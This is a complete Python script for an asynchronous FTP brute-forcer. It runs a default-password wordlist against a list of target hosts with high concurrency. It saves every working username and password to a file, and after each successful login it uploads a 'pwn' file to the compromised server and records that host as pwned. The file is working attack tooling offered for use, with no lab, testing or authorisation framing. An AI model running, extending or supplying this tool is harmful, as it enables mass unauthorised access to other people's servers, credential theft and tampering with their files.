#!/usr/bin/env python3
"""
FTP Brute Forcer
================
Modern asynchronous FTP credential brute-forcer with rich output.
"""

from __future__ import annotations

import argparse
import asyncio
import ftplib
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

console = Console()

DEFAULT_WORDLIST = Path("ftp-betterdefaultpasslist.txt")
DEFAULT_CONCURRENCY = 50
DEFAULT_TIMEOUT = 15
PWN_FILE = Path("pwn.txt")


@dataclass(frozen=True)
class Credential:
    username: str
    password: str

    @classmethod
    def from_line(cls, line: str) -> Credential:
        username, password = line.strip().split(":", 1)
        return cls(username, password)


@dataclass(frozen=True)
class BruteResult:
    host: str
    credential: Credential | None
    pwned: bool = False


def parse_host(hostname: str) -> str:
    hostname = hostname.strip()
    if "://" in hostname:
        hostname = hostname.split("/")[2]
    if ":" in hostname:
        hostname = hostname.split(":")[0]
    return hostname.rstrip("/")


def load_wordlist(path: Path) -> list[Credential]:
    if not path.exists():
        console.print(f"[red]✘ Wordlist not found: {path}[/red]")
        sys.exit(1)
    lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()
    creds = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        try:
            creds.append(Credential.from_line(line))
        except ValueError:
            continue
    return creds


def load_targets(path: Path) -> list[str]:
    if not path.exists():
        console.print(f"[red]✘ Target file not found: {path}[/red]")
        sys.exit(1)
    lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()
    return [parse_host(line) for line in lines if line.strip() and not line.startswith("#")]


class FtpBruteForcer:
    def __init__(
        self,
        wordlist: list[Credential],
        concurrency: int = DEFAULT_CONCURRENCY,
        timeout: int = DEFAULT_TIMEOUT,
        pwn_file: Path = PWN_FILE,
        output_dir: Path = Path("."),
    ) -> None:
        self.wordlist = wordlist
        self.concurrency = concurrency
        self.timeout = timeout
        self.pwn_file = pwn_file
        self.output_dir = output_dir
        self._results: list[BruteResult] = []

    def _attempt_login(self, host: str, cred: Credential) -> tuple[bool, ftplib.FTP | None]:
        try:
            conn = ftplib.FTP(host, timeout=self.timeout)
            conn.login(cred.username, cred.password)
            return True, conn
        except ftplib.all_errors:
            return False, None

    def _upload_pwn(self, conn: ftplib.FTP) -> bool:
        if not self.pwn_file.exists():
            return False
        try:
            with self.pwn_file.open("rb") as fh:
                conn.storbinary(f"STOR {self.pwn_file.name}", fh)
            return True
        except ftplib.all_errors:
            return False

    async def _brute_host(self, host: str) -> BruteResult:
        for cred in self.wordlist:
            success, conn = await asyncio.to_thread(self._attempt_login, host, cred)
            if success and conn:
                ftp_format = f"ftp://{cred.username}:{cred.password}@{host}:21"
                console.print(f"[green]✔[/green] Login Success: {host} {cred.username}:{cred.password}")

                self._save(self.output_dir / "ftp-creds.txt", ftp_format)

                pwned = await asyncio.to_thread(self._upload_pwn, conn)
                if pwned:
                    self._save(self.output_dir / "ftp-pwned.txt", ftp_format)
                    console.print(f"[yellow]⚠[/yellow] PWN file uploaded to {host}")

                await asyncio.to_thread(conn.quit)
                return BruteResult(host, cred, pwned)

            console.print(f"[red]✘[/red] Login Failed: {host} {cred.username}:{cred.password}", end="\r")

        console.print(f"[red]✘[/red] Exhausted: {host:<30}")
        return BruteResult(host, None)

    @staticmethod
    def _save(path: Path, data: str) -> None:
        try:
            with path.open("a", encoding="utf-8") as fh:
                fh.write(data + "\n")
        except OSError as exc:
            console.print(f"[red]Failed to write {path}: {exc}[/red]")

    async def run(self, targets: Iterable[str]) -> None:
        semaphore = asyncio.Semaphore(self.concurrency)

        async def bounded_brute(host: str) -> BruteResult:
            async with semaphore:
                return await self._brute_host(host)

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console,
            transient=True,
        ) as progress:
            task_id = progress.add_task(
                f"[cyan]Brute-forcing {len(list(targets))} host(s)...",
                total=None,
            )
            # Re-materialize targets for the gather
            target_list = list(targets)
            progress.update(task_id, description=f"[cyan]Brute-forcing {len(target_list)} host(s)...")
            self._results = await asyncio.gather(*[bounded_brute(h) for h in target_list])

        self._render_results()

    def _render_results(self) -> None:
        table = Table(title="FTP Brute Results", show_lines=True)
        table.add_column("Host", style="cyan")
        table.add_column("Status", style="bold")
        table.add_column("Credential", style="green")
        table.add_column("PWN", style="yellow")

        success_count = 0
        for res in self._results:
            if res.credential:
                success_count += 1
                cred_text = f"{res.credential.username}:{res.credential.password}"
                table.add_row(
                    res.host,
                    "[green]OK[/green]",
                    cred_text,
                    "[green]Yes[/green]" if res.pwned else "[red]No[/red]",
                )
            else:
                table.add_row(res.host, "[red]FAIL[/red]", "—", "—")

        console.print()
        console.print(table)
        console.print()
        console.print(f"[green]✔ Success:[/green] {success_count} / {len(self._results)}")
        if success_count:
            console.print(f"[dim]Creds saved to {self.output_dir / 'ftp-creds.txt'}[/dim]")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Asynchronous FTP brute-forcer with default credentials.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  %(prog)s -t targets.txt
  %(prog)s -t targets.txt -w wordlist.txt -c 100 -o results/
        """,
    )
    parser.add_argument("-t", "--targets", required=True, help="File containing target hosts/URLs")
    parser.add_argument("-w", "--wordlist", type=Path, default=DEFAULT_WORDLIST, help="Credential wordlist")
    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="Max concurrent connections")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="FTP connection timeout")
    parser.add_argument("-o", "--output", type=Path, default=Path("."), help="Output directory")
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    args.output.mkdir(parents=True, exist_ok=True)
    wordlist = load_wordlist(args.wordlist)
    targets = load_targets(args.targets)

    if not wordlist:
        console.print("[red]✘ No valid credentials in wordlist.[/red]")
        sys.exit(1)
    if not targets:
        console.print("[red]✘ No valid targets.[/red]")
        sys.exit(1)

    forcer = FtpBruteForcer(
        wordlist=wordlist,
        concurrency=args.concurrency,
        timeout=args.timeout,
        output_dir=args.output,
    )
    try:
        asyncio.run(forcer.run(targets))
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted by user.[/yellow]")
        sys.exit(130)


if __name__ == "__main__":
    main()
